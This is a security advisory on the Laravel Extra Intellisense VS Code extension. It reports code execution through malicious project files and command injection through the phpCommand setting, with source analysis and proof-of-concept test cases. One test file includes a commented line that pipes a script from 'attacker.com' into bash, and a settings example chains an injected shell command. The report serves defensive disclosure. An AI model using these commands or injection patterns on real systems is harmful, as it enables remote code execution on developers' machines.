# Laravel Extra Intellisense Extension Vulnerabilities

## Remote Code Execution (RCE) via Malicious Laravel Files

### Description
The Laravel Extra Intellisense extension regularly executes PHP code to extract information from the Laravel application for autocomplete functionality. A threat actor could craft malicious Laravel files (like models, views, routes, etc.) that, when processed by the extension, would cause it to generate and execute harmful PHP code through the configured PHP command.

When the extension runs Laravel application code using the `Helpers.runLaravel()` method, it executes arbitrary PHP code with the privileges of the configured `phpCommand` setting. This is particularly dangerous when Docker containers are used since the command might have elevated privileges within the container.

### Impact
An attacker can achieve remote code execution with the privileges of whatever user is running the configured PHP command. In Docker environments, this could mean root access to the container, allowing file system access, sensitive data exposure, or even container escape depending on the Docker configuration.

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
The extension includes a Security Note in its documentation warning users that it executes Laravel application code and suggesting to disable the extension when writing sensitive code in service providers.

### Missing Mitigations
1. The extension lacks input sanitization for the PHP code it generates and executes.
2. There's no sandboxing or privilege limitation mechanism in place.
3. No verification process to ensure that the PHP code being executed is safe.
4. No option to allow users to review and approve the PHP commands before execution.

### Preconditions
1. The victim must have the Laravel Extra Intellisense extension installed.
2. The victim must open a malicious Laravel project in VS Code.
3. The extension must be enabled.

### Source Code Analysis
The vulnerability lies primarily in how the extension generates and executes PHP code:

1. In `helpers.ts`, the `runLaravel()` method builds a PHP script that bootstraps Laravel and executes user-provided code:
```typescript
static runLaravel(code: string, description: string|null = null) : Promise<string> {
    code = code.replace(/(?:\r\n|\r|\n)/g, ' ');
    if (fs.existsSync(Helpers.projectPath("vendor/autoload.php")) && fs.existsSync(Helpers.projectPath("bootstrap/app.php"))) {
        var command =
            "define('LARAVEL_START', microtime(true));" +
            "require_once '" + Helpers.projectPath("vendor/autoload.php", true) + "';" +
            "$app = require_once '" + Helpers.projectPath("bootstrap/app.php", true) + "';" +
            // ...additional code that executes the provided PHP code
```

2. This generated code is then executed using the `runPhp()` method:
```typescript
static async runPhp(code: string, description: string|null = null) : Promise<string> {
    code = code.replace(/\"/g, "\\\"");
    // Additional string escaping...
    let commandTemplate = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand') ?? "php -r \"{code}\"";
    let command = commandTemplate.replace("{code}", code);
    // Execute the command using child_process.exec
    cp.exec(command, ...);
}
```

3. This PHP execution happens across multiple providers that extract information from Laravel:
   - `RouteProvider.loadRoutes()`
   - `ViewProvider.loadViews()`
   - `ConfigProvider.loadConfigs()`
   - `EloquentProvider.loadModels()`
   - And others...

The attack vector becomes clear: if a malicious Laravel project contains code in its models, views, routes, etc. that can escape the PHP script context or inject malicious code into the generated PHP command, it could execute arbitrary commands with the privileges of the configured PHP command.

### Security Test Case

1. Create a malicious Laravel project with a modified model file in `app/Models/MaliciousModel.php`:
```php
<?php
namespace App\Models;

use Illuminate\Database\Eloquent\Model;

class MaliciousModel extends Model
{
    public function __construct()
    {
        parent::__construct();

        // Create a malicious file for proof of concept
        file_put_contents(
            '/tmp/vscode_laravel_extra_intellisense_exploit.txt',
            'Exploitation successful at ' . date('Y-m-d H:i:s')
        );

        // For more severe exploitation, could include shell commands:
        // system('curl -s http://attacker.com/payload.sh | bash');
    }
}
```

2. Set up the Laravel project with all necessary files (composer.json, .env, etc).

3. Open the project in VS Code with the Laravel Extra Intellisense extension installed.

4. Wait for the extension to automatically scan the models (or trigger a model scan by opening a file that would utilize model autocompletion).

5. Verify the attack was successful by checking for the creation of `/tmp/vscode_laravel_extra_intellisense_exploit.txt`.

6. For Docker environments, create a more dangerous scenario by configuring the extension to use Docker:
```json
"LaravelExtraIntellisense.phpCommand": "docker exec -u root laravel_container php -r \"{code}\""
```

7. With this configuration, the malicious code would execute as root within the container, potentially allowing for container escape or other serious compromises.

The vulnerability is particularly dangerous because it executes automatically when the extension processes the Laravel codebase, without requiring any specific user action beyond opening the project.

## Command Injection via Custom PHP Command Configuration

### Description
The Laravel Extra Intellisense extension allows users to customize the PHP command used to execute code through the `LaravelExtraIntellisense.phpCommand` setting. This setting doesn't properly validate or sanitize user input, potentially allowing a malicious actor to inject additional commands.

### Impact
An attacker who can manipulate the extension's configuration could execute arbitrary commands on the host system with the same privileges as the VS Code process.

### Vulnerability Rank
High

### Currently Implemented Mitigations
None. The extension accepts any string as the phpCommand configuration without validation.

### Missing Mitigations
1. Input validation for the phpCommand setting
2. Use of safe command execution methods rather than directly injecting the code into a shell command
3. Principle of least privilege enforcement when executing commands

### Preconditions
1. The attacker must have the ability to modify the user's VS Code settings (either through physical access, through another vulnerability, or by tricking the user)
2. Laravel Extra Intellisense extension must be installed and enabled

### Source Code Analysis
In `helpers.ts`, the extension retrieves and uses the custom PHP command without validation:

```typescript
let commandTemplate = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand') ?? "php -r \"{code}\"";
let command = commandTemplate.replace("{code}", code);
cp.exec(command, { cwd: vscode.workspace.workspaceFolders && vscode.workspace.workspaceFolders.length > 0 ? vscode.workspace.workspaceFolders[0].uri.fsPath : undefined },
    function (err, stdout, stderr) {
        // Handle execution results
    }
);
```

The issue is that `commandTemplate` is directly obtained from user settings, and while `{code}` is replaced with the PHP code to execute, there's no validation that the command template itself doesn't contain malicious shell commands. The use of `cp.exec()` executes commands through a shell, which allows for command chaining and injection.

### Security Test Case
1. Modify the VS Code user settings (or workspace settings) to include a malicious command:

```json
{
  "LaravelExtraIntellisense.phpCommand": "php -r \"{code}\" & echo 'Malicious command' > /tmp/pwned.txt"
}
```

2. Open a Laravel project with the Laravel Extra Intellisense extension.

3. The extension will execute its normal PHP commands to extract Laravel information, but due to the command chaining with `&`, it will also execute the attacker's command.

4. Verify that `/tmp/pwned.txt` has been created with the content "Malicious command", proving the command injection was successful.

5. A real attacker could use more harmful commands, such as:
   - Exfiltrating sensitive data
   - Installing malware
   - Creating backdoors
   - Modifying system files

This vulnerability is serious because it gives an attacker a way to execute arbitrary commands with the user's privileges, bypassing VS Code's sandbox model for extensions.
